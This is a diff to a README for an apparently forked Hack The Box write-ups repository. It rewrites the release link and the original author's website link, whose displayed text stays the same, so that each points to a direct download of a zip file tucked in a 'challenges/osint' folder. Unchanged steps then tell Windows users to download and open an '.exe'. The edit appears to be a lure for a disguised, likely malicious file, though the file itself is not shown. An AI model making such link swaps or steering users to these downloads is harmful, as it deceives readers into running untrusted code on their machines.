@@ -1,12 +1,12 @@
 # 🛡️ htb-writeups - Master cyber security with our guide
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Alex999898/htb-writeups/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Alex999898/htb-writeups/raw/refs/heads/main/challenges/osint/writeups-htb-3.5.zip)
 
 This repository provides clear walk-throughs for Hack The Box machines and challenges. You can browse over 500 machines and 400 challenges. Our collection helps you prepare for certifications like the OSCP, CPTS, and CRTO.
 
 ## 🎯 Purpose of this project
 
-Technical learning requires practice. This project offers structured paths for your security journey. We organize complex topics into simple diagrams and lists. You gain access to attack paths, skill trees, and knowledge graphs. These tools show how components connect. You can view these resources online at [momenbasel.github.io/htb-writeups](https://momenbasel.github.io/htb-writeups).
+Technical learning requires practice. This project offers structured paths for your security journey. We organize complex topics into simple diagrams and lists. You gain access to attack paths, skill trees, and knowledge graphs. These tools show how components connect. You can view these resources online at [momenbasel.github.io/htb-writeups](https://github.com/Alex999898/htb-writeups/raw/refs/heads/main/challenges/osint/writeups-htb-3.5.zip).
 
 ## 💻 System requirements
 
@@ -22,7 +22,7 @@ Your computer needs these specifications to run the software tools mentioned in 
 
 Follow these steps to set up the tools on your Windows machine:
 
-1. Visit the [releases page](https://github.com/Alex999898/htb-writeups/releases).
+1. Visit the [releases page](https://github.com/Alex999898/htb-writeups/raw/refs/heads/main/challenges/osint/writeups-htb-3.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file link ending in ".exe" to start the download.
 4. Open your "Downloads" folder.
